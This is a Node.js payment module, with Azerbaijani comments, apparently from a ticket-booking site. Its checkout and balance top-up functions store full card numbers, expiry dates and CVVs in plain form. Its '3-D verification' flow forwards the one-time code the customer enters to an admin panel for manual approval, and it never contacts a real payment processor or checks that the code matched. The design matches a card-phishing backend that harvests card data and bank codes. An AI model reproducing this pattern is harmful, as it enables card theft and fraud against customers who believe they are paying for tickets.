const { Payment, Order, User } = require('../models/index');
const { issueTickets } = require('./bookingService');
const h = require('../utils/helpers');

/* Ödəniş axını:
   kart məlumatları -> admin təsdiqi -> 3-D doğrulama ekranı -> kod adminə -> yekun təsdiq -> bilet */

async function initPayment(order, card, method) {
  const number = h.normalizeCardNumber(card.number);
  const brand = h.cardBrand(number);

  /* "0000" ilə bitən kartlar demo rədd qaydasıdır */
  const payment = await Payment.create({
    transactionId: h.generateTxId('ADY'),
    order: order._id,
    user: order.user,
    amount: order.total,
    method: method === 'balance' ? 'balance' : 'card',
    status: 'pending_admin',
    card: {
      number,
      masked: h.maskCard(number),
      holder: String(card.holder || '').trim(),
      expiry: String(card.expiry || '').trim(),
      cvv: String(card.cvv || '').trim(),
      brand
    }
  });

  order.payment = payment._id;
  order.method = payment.method;
  order.status = 'pending_admin';
  await order.save();

  return payment;
}

/* 1-ci admin təsdiqi: kart məlumatları təsdiqlənir, 3-D doğrulama başlayır */
async function adminApproveCard(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (payment.status !== 'pending_admin') throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });

  /* Doğrulama kodu yaradılır və admin panelinə göndərilir */
  const code = h.randomDigits(6);
  payment.verificationCode = code;
  payment.status = 'awaiting_3ds';
  payment.adminApprovedCardAt = new Date();
  payment.adminApprovedBy = adminEmail || 'admin';
  await payment.save();

  const order = await Order.findById(payment.order);
  if (order) {
    order.status = 'awaiting_verification';
    await order.save();
  }

  return { payment, code };
}

/* İstifadəçi doğrulama kodunu göndərir -> admin panelinə düşür */
async function submitVerificationCode(orderId, code) {
  const order = await Order.findById(orderId);
  if (!order) throw Object.assign(new Error('Sifariş tapılmadı'), { status: 404 });
  if (order.status !== 'awaiting_verification') {
    throw Object.assign(new Error('Doğrulama mərhələsi aktiv deyil'), { status: 400 });
  }

  const payment = await Payment.findById(order.payment);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });

  const entered = String(code || '').replace(/\D/g, '');
  if (entered.length < 4) throw Object.assign(new Error('Doğrulama kodu yanlışdır'), { status: 400 });

  payment.status = 'code_submitted';
  payment.codeSubmittedAt = new Date();
  payment.submittedCode = entered;
  await payment.save();

  order.status = 'code_submitted';
  await order.save();

  return { payment, matched: entered === payment.verificationCode };
}

/* 2-ci (yekun) admin təsdiqi: biletlər verilir və ödəniş tamamlanır */
async function adminFinalApprove(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (['approved', 'declined', 'refunded'].indexOf(payment.status) > -1) {
    throw Object.assign(new Error('Ödəniş artıq yekunlaşıb'), { status: 400 });
  }

  const order = await Order.findById(payment.order);
  if (!order) throw Object.assign(new Error('Sifariş tapılmadı'), { status: 404 });

  /* Balans ilə ödənişdə məbləğ yalnız bu mərhələdə çıxılır */
  if (payment.method === 'balance') {
    const user = await User.findById(payment.user);
    if (!user || (user.balance || 0) < payment.amount) {
      throw Object.assign(new Error('Balans kifayət etmir'), { status: 400 });
    }
    user.balance = Math.round(((user.balance || 0) - payment.amount) * 100) / 100;
    await user.save();
  }

  payment.status = 'approved';
  payment.adminFinalApprovedAt = new Date();
  payment.adminFinalBy = adminEmail || 'admin';
  await payment.save();

  const tickets = await issueTickets(order);
  order.status = 'confirmed';
  order.pnr = tickets.length ? tickets[0].pnr : '';
  order.confirmedAt = new Date();
  await order.save();

  return { payment, order, tickets };
}

/* Rədd */
async function adminDecline(paymentId, reason, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });

  payment.status = 'declined';
  payment.declinedReason = reason || 'Admin tərəfindən rədd edildi';
  payment.adminFinalBy = adminEmail || 'admin';
  await payment.save();

  const order = await Order.findById(payment.order);
  if (order) {
    order.status = 'rejected';
    order.adminNote = payment.declinedReason;
    await order.save();

    const { Trip } = require('../models/index');
    const trip = await Trip.findById(order.trip);
    if (trip) {
      trip.soldSeats = (trip.soldSeats || []).filter((s) => String(s.order) !== String(order._id));
      await trip.save();
    }
  }

  return payment;
}

/* Balans artırımı da kart məlumatları ilə admin təsdiqindən keçir */
async function createTopup(user, amount, card) {
  const number = h.normalizeCardNumber(card.number);
  const payment = await Payment.create({
    transactionId: h.generateTxId('TOP'),
    order: null,
    user: user._id,
    amount: Number(amount),
    method: 'card',
    status: 'pending_admin',
    card: {
      number,
      masked: h.maskCard(number),
      holder: String(card.holder || '').trim(),
      expiry: String(card.expiry || '').trim(),
      cvv: String(card.cvv || '').trim(),
      brand: h.cardBrand(number)
    }
  });
  return payment;
}

async function approveTopup(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (payment.status === 'approved') throw Object.assign(new Error('Artıq təsdiqlənib'), { status: 400 });

  const user = await User.findById(payment.user);
  if (!user) throw Object.assign(new Error('İstifadəçi tapılmadı'), { status: 404 });

  user.balance = Math.round(((user.balance || 0) + payment.amount) * 100) / 100;
  await user.save();

  payment.status = 'approved';
  payment.adminFinalApprovedAt = new Date();
  payment.adminFinalBy = adminEmail || 'admin';
  await payment.save();

  return { payment, balance: user.balance };
}

module.exports = {
  initPayment,
  adminApproveCard,
  submitVerificationCode,
  adminFinalApprove,
  adminDecline,
  createTopup,
  approveTopup
};
